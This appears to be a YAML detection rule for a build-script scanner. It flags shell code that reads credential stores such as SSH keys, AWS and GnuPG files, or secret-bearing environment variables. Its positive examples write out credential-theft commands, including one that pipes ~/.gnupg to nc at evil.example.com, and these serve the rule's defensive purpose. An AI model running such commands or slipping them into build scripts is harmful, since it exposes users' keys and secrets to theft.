name: credentials
version: "0.1.0"
language: shell
attck:
  - T1552.001
  - T1552.004
message: >-
  A build script naming a credential store is reading, or preparing to read,
  something that only exists to authenticate its owner. Nothing a package
  needs in order to build lives in these files, and a build runs with the full
  privileges of whoever installs the package.
regex: '(\.ssh/|\.aws/|\.netrc|\.pgpass|\.docker/config\.json|\.config/gcloud|\.kube/config|id_rsa|id_dsa|id_ecdsa|id_ed25519|\.gnupg/|credentials\.json)|[A-Z][A-Z0-9_]*(TOKEN|SECRET|PASSWORD|PASSWD|API_?KEY|PRIVATE_KEY)'
positive_examples:
  - |
    cat $HOME/.ssh/id_rsa
  - |
    cp ~/.aws/credentials /tmp/collected
  - |
    curl --netrc-file ~/.netrc https://example.com
  - |
    TOKEN=$GITHUB_TOKEN
  - |
    echo $AWS_SECRET_ACCESS_KEY >> /tmp/out
  - |
    tar czf - ~/.gnupg/ | nc evil.example.com 4444
negative_examples:
  - |
    PKG_LIBS=-lssh2
  - |
    SRC_DIR=src/credential_helpers
  - |
    AC_CHECK_HEADERS([openssl/ssl.h])
  - |
    mkdir -p $(DESTDIR)/share/doc
